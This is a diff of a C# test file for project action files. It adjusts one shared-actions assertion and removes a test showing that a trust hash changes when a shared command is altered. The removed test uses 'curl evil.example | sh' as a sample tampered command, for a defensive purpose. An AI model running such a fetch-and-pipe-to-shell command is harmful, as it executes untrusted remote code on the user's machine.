@@ -80,7 +80,7 @@ public sealed class ProjectFileTests : IDisposable
         Assert.Equal(["Run tests", "Tail logs", "My build"], both.Actions.Select(a => a.Name));
         Assert.Equal(("local:0", ProjectFileScope.Local), (both.Actions[2].Id, both.Actions[2].Scope));
         Assert.Equal(["Board", "https://github.com/org/repo/compare/{branch}?expand=1", "My board"], both.Links.Select(l => l.Name));
-        Assert.Equal(["Run tests", "Tail logs"], both.SharedActions.Select(a => a.Name));
+        Assert.Equal(["Run tests", "Tail logs"], both.Actions.Where(a => a.Scope == ProjectFileScope.Shared).Select(a => a.Name));
     }
 
     [Fact]
@@ -144,20 +144,6 @@ public sealed class ProjectFileTests : IDisposable
         Assert.Throws<InvalidOperationException>(() => ProjectFile.WriteActions(folder, ProjectFileScope.Shared, []));
         Assert.Throws<InvalidOperationException>(() => ProjectFile.ReadEntries(folder, ProjectFileScope.Shared, ToolOS.Linux));
         Assert.Equal("{ broken", File.ReadAllText(broken));
-    }
-
-    // ---- Trust ---------------------------------------------------------------------------------------------------------
-
-    [Fact]
-    public void The_trust_hash_changes_when_a_shared_command_does()
-    {
-        var before = ProjectFile.Parse(Shared, ProjectFileScope.Shared, ToolOS.Linux).SharedActions;
-        var same = ProjectFile.Parse(Shared.Replace("// Committed with the project.", "// A comment changed."), ProjectFileScope.Shared, ToolOS.Linux).SharedActions;
-        var changed = ProjectFile.Parse(Shared.Replace("dotnet test", "curl evil.example | sh"), ProjectFileScope.Shared, ToolOS.Linux).SharedActions;
-
-        Assert.Equal(ProjectFile.Hash(before), ProjectFile.Hash(same));
-        Assert.NotEqual(ProjectFile.Hash(before), ProjectFile.Hash(changed));
-        Assert.Equal(64, ProjectFile.Hash(before).Length);
     }
 
     // ---- Links ----------------------------------------------------------------------------------------------------------
